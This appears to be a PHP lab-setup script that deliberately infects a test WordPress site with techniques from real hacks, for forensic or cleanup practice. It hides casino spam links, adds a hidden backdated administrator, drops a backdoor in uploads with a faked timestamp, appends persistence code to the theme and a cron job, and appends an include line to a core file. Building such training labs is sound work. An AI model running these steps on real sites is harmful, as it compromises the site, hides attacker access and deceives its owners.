<?php
// Infects the lab site with seven techniques seen on real hacked WordPress sites.
// Every sample is inert. Run with: wp eval-file /infect/infect.php

$dir = '/infect/payloads';
$casino = '<div class="wpch" style="position:absolute;left:-9999px">'
    . '<a href="https://royal-spin-casino.example/">casino siteleri</a> '
    . '<a href="https://slot-bonus-tr.example/">deneme bonusu</a> '
    . '<a href="https://bahis-giris.example/">bahis giris</a></div>';

// 5. Payloads stashed in the database so the injector can be rebuilt.
update_option('wpch_blocks', base64_encode($casino), false);
update_option('wpch_core', base64_encode(file_get_contents("$dir/cache-helper.php")), false);

// 1. Cloaked casino injector disguised as a cache plugin.
wp_mkdir_p(WPMU_PLUGIN_DIR);
copy("$dir/cache-helper.php", WPMU_PLUGIN_DIR . '/wp-cache-helper.php');

// 2. Hidden spam links inside two posts.
foreach (['whitening-myths', 'night-guards'] as $slug) {
    $p = get_page_by_path($slug, OBJECT, 'post');
    if ($p && strpos($p->post_content, 'display:none') === false) {
        wp_update_post([
            'ID' => $p->ID,
            'post_content' => $p->post_content
                . "\n<div style=\"display:none\"><a href=\"https://royal-spin-casino.example/\">canli casino</a></div>",
        ]);
    }
}

// 3. Extra administrator, hidden from the users list by the theme snippet.
if (!username_exists('wpsupport')) {
    $id = wp_insert_user([
        'user_login' => 'wpsupport',
        'user_pass' => wp_generate_password(24),
        'user_email' => 'wpsupport@mail-relay.example',
        'role' => 'administrator',
    ]);
    // Backdated to the break-in, as attackers usually do.
    global $wpdb;
    $wpdb->update($wpdb->users, ['user_registered' => '2026-10-28 03:14:07'], ['ID' => $id]);
}

// 4. "Backdoor" dropped into uploads.
$up = WP_CONTENT_DIR . '/uploads/2025/03';
wp_mkdir_p($up);
copy("$dir/thumb-cache.php", "$up/thumb-cache.php");
touch("$up/thumb-cache.php", strtotime('2025-03-14 10:22:00'));

// 3 + 5. Theme snippet: hides the admin and restores the injector.
$fn = get_stylesheet_directory() . '/functions.php';
$code = file_get_contents($fn);
if (strpos($code, 'wp_update_plugins_check') === false) {
    file_put_contents($fn, $code . "\n" . file_get_contents("$dir/theme-snippet.php"));
}
if (!wp_next_scheduled('wp_update_plugins_check')) {
    wp_schedule_event(time() + 60, 'hourly', 'wp_update_plugins_check');
}

// 6. One line added to a core file so the backdoor loads on every request.
$core = ABSPATH . WPINC . '/general-template.php';
$line = "\nif (defined('ABSPATH')) { @include_once ABSPATH . 'wp-content/uploads/2025/03/thumb-cache.php'; }\n";
if (strpos(file_get_contents($core), 'thumb-cache.php') === false) {
    file_put_contents($core, $line, FILE_APPEND);
}

echo "infected: 6 techniques in files and database (the 7th is the access log)\n";
